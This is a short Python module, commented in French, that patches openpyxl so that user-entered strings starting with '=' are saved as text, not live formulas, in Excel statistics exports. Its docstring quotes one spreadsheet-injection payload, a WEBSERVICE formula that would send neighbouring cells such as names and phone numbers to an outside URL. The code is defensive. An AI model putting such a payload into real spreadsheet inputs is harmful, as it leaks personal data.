"""Exports Excel : aucune formule active sauf celles écrites exprès par le code.

openpyxl transforme en FORMULE toute chaîne qui commence par « = ». Un nom
saisi au kiosque (page publique) comme ``=WEBSERVICE("http://…"&C2)``
devenait une formule active dans les exports statistiques : à l'ouverture,
Excel pouvait envoyer les cellules voisines (noms, téléphones) ailleurs.

``installer_garde_formules`` fait de ces chaînes du texte, pour tous les
exports d'un coup. Une formule voulue s'écrit ``Formule("=SUM(A1:A3)")``.
Les classeurs relus (imports, modèles) ne sont pas concernés : openpyxl
les charge sans passer par l'affectation de valeur.
"""
from openpyxl.cell.cell import Cell


class Formule(str):
    """Formule écrite volontairement par le code (jamais une donnée saisie)."""


_bind_value_origine = Cell._bind_value


def _bind_value_sans_formule(self, value):
    _bind_value_origine(self, value)
    if self.data_type == "f" and isinstance(value, str) and not isinstance(value, Formule):
        self.data_type = "s"


def installer_garde_formules() -> None:
    if Cell._bind_value is not _bind_value_sans_formule:
        Cell._bind_value = _bind_value_sans_formule
